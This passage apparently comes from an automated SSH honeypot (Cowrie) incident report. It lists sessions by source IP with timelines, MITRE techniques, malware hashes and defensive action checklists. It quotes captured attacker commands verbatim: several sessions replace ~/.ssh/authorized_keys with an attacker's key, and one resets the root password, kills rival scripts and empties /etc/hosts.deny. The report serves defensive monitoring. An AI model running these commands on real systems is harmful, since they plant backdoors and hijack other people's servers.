| `2026-04-13 06:05:17` | `cowrie.session.connect` |
| `2026-04-13 06:05:17` | `cowrie.client.version` |
| `2026-04-13 06:05:17` | `cowrie.client.kex` |
| `2026-04-13 06:05:17` | `cowrie.login.success` |
| `2026-04-13 06:05:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.123.53[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.123.53[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7482da754ab

| Field | Detail |
|---|---|
| **Source IP** | `103.123.53[.]88` |
| **First Seen** | 2026-04-13 06:06 |
| **Last Seen** | 2026-04-13 06:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:06:56` | `cowrie.session.connect` |
| `2026-04-13 06:06:56` | `cowrie.client.version` |
| `2026-04-13 06:06:56` | `cowrie.client.kex` |
| `2026-04-13 06:06:57` | `cowrie.login.success` |
| `2026-04-13 06:06:57` | `cowrie.session.params` |
| `2026-04-13 06:06:57` | `cowrie.command.input` |
| `2026-04-13 06:06:57` | `cowrie.command.failed` |
| `2026-04-13 06:06:57` | `cowrie.log.closed` |
| `2026-04-13 06:06:57` | `cowrie.session.params` |
| `2026-04-13 06:06:57` | `cowrie.command.input` |
| `2026-04-13 06:06:57` | `cowrie.session.file_download` |
| `2026-04-13 06:06:57` | `cowrie.log.closed` |
| `2026-04-13 06:06:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.123.53[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.123.53[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a9898045440

| Field | Detail |
|---|---|
| **Source IP** | `103.123.53[.]88` |
| **First Seen** | 2026-04-13 06:06 |
| **Last Seen** | 2026-04-13 06:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:06:58` | `cowrie.session.connect` |
| `2026-04-13 06:06:58` | `cowrie.client.version` |
| `2026-04-13 06:06:58` | `cowrie.client.kex` |
| `2026-04-13 06:06:58` | `cowrie.login.success` |
| `2026-04-13 06:06:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.123.53[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.123.53[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d085a537f172

| Field | Detail |
|---|---|
| **Source IP** | `112.216.108[.]62` |
| **First Seen** | 2026-04-13 06:07 |
| **Last Seen** | 2026-04-13 06:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:07:02` | `cowrie.session.connect` |
| `2026-04-13 06:07:02` | `cowrie.client.version` |
| `2026-04-13 06:07:02` | `cowrie.client.kex` |
| `2026-04-13 06:07:02` | `cowrie.login.success` |
| `2026-04-13 06:07:03` | `cowrie.session.params` |
| `2026-04-13 06:07:03` | `cowrie.command.input` |
| `2026-04-13 06:07:03` | `cowrie.command.failed` |
| `2026-04-13 06:07:03` | `cowrie.log.closed` |
| `2026-04-13 06:07:03` | `cowrie.session.params` |
| `2026-04-13 06:07:03` | `cowrie.command.input` |
| `2026-04-13 06:07:03` | `cowrie.session.file_download` |
| `2026-04-13 06:07:03` | `cowrie.log.closed` |
| `2026-04-13 06:07:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.216.108[.]62` to AbuseIPDB if not already reported
- [ ] Block `112.216.108[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04fdbf58dcc9

| Field | Detail |
|---|---|
| **Source IP** | `112.216.108[.]62` |
| **First Seen** | 2026-04-13 06:07 |
| **Last Seen** | 2026-04-13 06:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:07:05` | `cowrie.session.connect` |
| `2026-04-13 06:07:05` | `cowrie.client.version` |
| `2026-04-13 06:07:05` | `cowrie.client.kex` |
| `2026-04-13 06:07:06` | `cowrie.login.success` |
| `2026-04-13 06:07:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.216.108[.]62` to AbuseIPDB if not already reported
- [ ] Block `112.216.108[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-671d3b22622c

| Field | Detail |
|---|---|
| **Source IP** | `177.70.6[.]158` |
| **First Seen** | 2026-04-13 06:08 |
| **Last Seen** | 2026-04-13 06:08 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:08:10` | `cowrie.session.connect` |
| `2026-04-13 06:08:10` | `cowrie.client.version` |
| `2026-04-13 06:08:10` | `cowrie.client.kex` |
| `2026-04-13 06:08:11` | `cowrie.login.success` |
| `2026-04-13 06:08:12` | `cowrie.session.params` |
| `2026-04-13 06:08:12` | `cowrie.command.input` |
| `2026-04-13 06:08:12` | `cowrie.command.failed` |
| `2026-04-13 06:08:12` | `cowrie.log.closed` |
| `2026-04-13 06:08:13` | `cowrie.session.params` |
| `2026-04-13 06:08:13` | `cowrie.command.input` |
| `2026-04-13 06:08:13` | `cowrie.session.file_download` |
| `2026-04-13 06:08:13` | `cowrie.log.closed` |
| `2026-04-13 06:08:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.70.6[.]158` to AbuseIPDB if not already reported
- [ ] Block `177.70.6[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97eb5f38f79d

| Field | Detail |
|---|---|
| **Source IP** | `177.70.6[.]158` |
| **First Seen** | 2026-04-13 06:08 |
| **Last Seen** | 2026-04-13 06:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:08:17` | `cowrie.session.connect` |
| `2026-04-13 06:08:17` | `cowrie.client.version` |
| `2026-04-13 06:08:17` | `cowrie.client.kex` |
| `2026-04-13 06:08:19` | `cowrie.login.success` |
| `2026-04-13 06:08:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.70.6[.]158` to AbuseIPDB if not already reported
- [ ] Block `177.70.6[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34831bc4cbd1

| Field | Detail |
|---|---|
| **Source IP** | `112.216.108[.]62` |
| **First Seen** | 2026-04-13 06:09 |
| **Last Seen** | 2026-04-13 06:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:09:04` | `cowrie.session.connect` |
| `2026-04-13 06:09:04` | `cowrie.client.version` |
| `2026-04-13 06:09:05` | `cowrie.client.kex` |
| `2026-04-13 06:09:05` | `cowrie.login.success` |
| `2026-04-13 06:09:05` | `cowrie.session.params` |
| `2026-04-13 06:09:05` | `cowrie.command.input` |
| `2026-04-13 06:09:05` | `cowrie.command.failed` |
| `2026-04-13 06:09:06` | `cowrie.log.closed` |
| `2026-04-13 06:09:06` | `cowrie.session.params` |
| `2026-04-13 06:09:06` | `cowrie.command.input` |
| `2026-04-13 06:09:06` | `cowrie.session.file_download` |
| `2026-04-13 06:09:06` | `cowrie.log.closed` |
| `2026-04-13 06:09:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.216.108[.]62` to AbuseIPDB if not already reported
- [ ] Block `112.216.108[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-857e84c47a17

| Field | Detail |
|---|---|
| **Source IP** | `112.216.108[.]62` |
| **First Seen** | 2026-04-13 06:09 |
| **Last Seen** | 2026-04-13 06:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:09:08` | `cowrie.session.connect` |
| `2026-04-13 06:09:08` | `cowrie.client.version` |
| `2026-04-13 06:09:08` | `cowrie.client.kex` |
| `2026-04-13 06:09:09` | `cowrie.login.success` |
| `2026-04-13 06:09:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.216.108[.]62` to AbuseIPDB if not already reported
- [ ] Block `112.216.108[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-775e7ef204ae

| Field | Detail |
|---|---|
| **Source IP** | `125.21.53[.]232` |
| **First Seen** | 2026-04-13 06:09 |
| **Last Seen** | 2026-04-13 06:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:09:24` | `cowrie.session.connect` |
| `2026-04-13 06:09:24` | `cowrie.client.version` |
| `2026-04-13 06:09:24` | `cowrie.client.kex` |
| `2026-04-13 06:09:24` | `cowrie.login.success` |
| `2026-04-13 06:09:24` | `cowrie.session.params` |
| `2026-04-13 06:09:24` | `cowrie.command.input` |
| `2026-04-13 06:09:24` | `cowrie.command.failed` |
| `2026-04-13 06:09:24` | `cowrie.log.closed` |
| `2026-04-13 06:09:24` | `cowrie.session.params` |
| `2026-04-13 06:09:24` | `cowrie.command.input` |
| `2026-04-13 06:09:24` | `cowrie.session.file_download` |
| `2026-04-13 06:09:24` | `cowrie.log.closed` |
| `2026-04-13 06:09:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.21.53[.]232` to AbuseIPDB if not already reported
- [ ] Block `125.21.53[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94ee6c9a98b9

| Field | Detail |
|---|---|
| **Source IP** | `125.21.53[.]232` |
| **First Seen** | 2026-04-13 06:09 |
| **Last Seen** | 2026-04-13 06:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:09:25` | `cowrie.session.connect` |
| `2026-04-13 06:09:25` | `cowrie.client.version` |
| `2026-04-13 06:09:25` | `cowrie.client.kex` |
| `2026-04-13 06:09:25` | `cowrie.login.success` |
| `2026-04-13 06:09:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.21.53[.]232` to AbuseIPDB if not already reported
- [ ] Block `125.21.53[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-454b1f1e73ba

| Field | Detail |
|---|---|
| **Source IP** | `152.32.163[.]183` |
| **First Seen** | 2026-04-13 06:10 |
| **Last Seen** | 2026-04-13 06:10 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:gJyQ9Tb1K2sb"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:10:25` | `cowrie.session.connect` |
| `2026-04-13 06:10:25` | `cowrie.client.version` |
| `2026-04-13 06:10:25` | `cowrie.client.kex` |
| `2026-04-13 06:10:25` | `cowrie.login.success` |
| `2026-04-13 06:10:26` | `cowrie.session.params` |
| `2026-04-13 06:10:26` | `cowrie.command.input` |
| `2026-04-13 06:10:26` | `cowrie.command.failed` |
| `2026-04-13 06:10:26` | `cowrie.log.closed` |
| `2026-04-13 06:10:26` | `cowrie.session.params` |
| `2026-04-13 06:10:26` | `cowrie.command.input` |
| `2026-04-13 06:10:26` | `cowrie.session.file_download` |
| `2026-04-13 06:10:26` | `cowrie.log.closed` |
| `2026-04-13 06:10:38` | `cowrie.session.params` |
| `2026-04-13 06:10:38` | `cowrie.command.input` |
| `2026-04-13 06:10:38` | `cowrie.log.closed` |
| `2026-04-13 06:10:39` | `cowrie.session.params` |
| `2026-04-13 06:10:39` | `cowrie.command.input` |
| `2026-04-13 06:10:39` | `cowrie.log.closed` |
| `2026-04-13 06:10:39` | `cowrie.session.params` |
| `2026-04-13 06:10:39` | `cowrie.command.input` |
| `2026-04-13 06:10:39` | `cowrie.session.file_download` |
| `2026-04-13 06:10:39` | `cowrie.log.closed` |
| `2026-04-13 06:10:39` | `cowrie.session.params` |
| `2026-04-13 06:10:39` | `cowrie.command.input` |
| `2026-04-13 06:10:39` | `cowrie.log.closed` |
| `2026-04-13 06:10:40` | `cowrie.session.params` |
| `2026-04-13 06:10:40` | `cowrie.command.input` |
| `2026-04-13 06:10:40` | `cowrie.log.closed` |
| `2026-04-13 06:10:40` | `cowrie.session.params` |
| `2026-04-13 06:10:40` | `cowrie.command.input` |
| `2026-04-13 06:10:40` | `cowrie.command.input` |
| `2026-04-13 06:10:40` | `cowrie.log.closed` |
| `2026-04-13 06:10:41` | `cowrie.session.params` |
| `2026-04-13 06:10:41` | `cowrie.command.input` |
| `2026-04-13 06:10:41` | `cowrie.log.closed` |
| `2026-04-13 06:10:41` | `cowrie.session.params` |
| `2026-04-13 06:10:41` | `cowrie.command.input` |
| `2026-04-13 06:10:41` | `cowrie.log.closed` |
| `2026-04-13 06:10:41` | `cowrie.session.params` |
| `2026-04-13 06:10:41` | `cowrie.command.input` |
| `2026-04-13 06:10:41` | `cowrie.log.closed` |
| `2026-04-13 06:10:42` | `cowrie.session.params` |
| `2026-04-13 06:10:42` | `cowrie.command.input` |
| `2026-04-13 06:10:42` | `cowrie.log.closed` |
| `2026-04-13 06:10:42` | `cowrie.session.params` |
| `2026-04-13 06:10:42` | `cowrie.command.input` |
| `2026-04-13 06:10:42` | `cowrie.log.closed` |
| `2026-04-13 06:10:42` | `cowrie.session.params` |
| `2026-04-13 06:10:42` | `cowrie.command.input` |
| `2026-04-13 06:10:42` | `cowrie.log.closed` |
| `2026-04-13 06:10:43` | `cowrie.session.params` |
| `2026-04-13 06:10:43` | `cowrie.command.input` |
| `2026-04-13 06:10:43` | `cowrie.log.closed` |
| `2026-04-13 06:10:43` | `cowrie.session.params` |
| `2026-04-13 06:10:43` | `cowrie.command.input` |
| `2026-04-13 06:10:43` | `cowrie.log.closed` |
| `2026-04-13 06:10:43` | `cowrie.session.params` |
| `2026-04-13 06:10:43` | `cowrie.command.input` |
| `2026-04-13 06:10:43` | `cowrie.log.closed` |
| `2026-04-13 06:10:44` | `cowrie.session.params` |
| `2026-04-13 06:10:44` | `cowrie.command.input` |
| `2026-04-13 06:10:44` | `cowrie.log.closed` |
| `2026-04-13 06:10:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.163[.]183` to AbuseIPDB if not already reported
- [ ] Block `152.32.163[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dffd5487e783

| Field | Detail |
|---|---|
| **Source IP** | `103.123.53[.]88` |
| **First Seen** | 2026-04-13 06:10 |
| **Last Seen** | 2026-04-13 06:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:10:28` | `cowrie.session.connect` |
| `2026-04-13 06:10:28` | `cowrie.client.version` |
| `2026-04-13 06:10:28` | `cowrie.client.kex` |
| `2026-04-13 06:10:28` | `cowrie.login.success` |
| `2026-04-13 06:10:28` | `cowrie.session.params` |
| `2026-04-13 06:10:28` | `cowrie.command.input` |
| `2026-04-13 06:10:28` | `cowrie.command.failed` |
| `2026-04-13 06:10:28` | `cowrie.log.closed` |
| `2026-04-13 06:10:28` | `cowrie.session.params` |
| `2026-04-13 06:10:28` | `cowrie.command.input` |
| `2026-04-13 06:10:28` | `cowrie.session.file_download` |
| `2026-04-13 06:10:28` | `cowrie.log.closed` |
| `2026-04-13 06:10:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.123.53[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.123.53[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ac3da268ede

| Field | Detail |
|---|---|
| **Source IP** | `103.123.53[.]88` |
| **First Seen** | 2026-04-13 06:10 |
| **Last Seen** | 2026-04-13 06:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:10:29` | `cowrie.session.connect` |
| `2026-04-13 06:10:29` | `cowrie.client.version` |
| `2026-04-13 06:10:29` | `cowrie.client.kex` |
| `2026-04-13 06:10:29` | `cowrie.login.success` |
| `2026-04-13 06:10:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.123.53[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.123.53[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abdac5711c0f

| Field | Detail |
|---|---|
| **Source IP** | `58.229.141[.]26` |
| **First Seen** | 2026-04-13 06:10 |
| **Last Seen** | 2026-04-13 06:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:10:43` | `cowrie.session.connect` |
| `2026-04-13 06:10:43` | `cowrie.client.version` |
| `2026-04-13 06:10:43` | `cowrie.client.kex` |
| `2026-04-13 06:10:44` | `cowrie.login.success` |
| `2026-04-13 06:10:44` | `cowrie.session.params` |
| `2026-04-13 06:10:44` | `cowrie.command.input` |
| `2026-04-13 06:10:44` | `cowrie.command.failed` |
| `2026-04-13 06:10:44` | `cowrie.log.closed` |
| `2026-04-13 06:10:45` | `cowrie.session.params` |
| `2026-04-13 06:10:45` | `cowrie.command.input` |
| `2026-04-13 06:10:45` | `cowrie.session.file_download` |
| `2026-04-13 06:10:45` | `cowrie.log.closed` |
